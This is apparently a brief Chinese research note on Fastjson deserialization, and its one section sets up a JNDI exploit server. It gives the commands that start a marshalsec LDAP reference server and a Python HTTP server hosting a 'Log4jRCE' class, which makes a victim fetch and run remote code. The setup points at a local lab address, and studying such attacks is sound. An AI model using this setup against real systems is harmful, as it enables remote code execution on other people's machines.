Fastjson反序列化研究


## 启动JNDI服务器

```shell
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/\#Log4jRCE 1389

cd test
python3 -m http.server 8081


```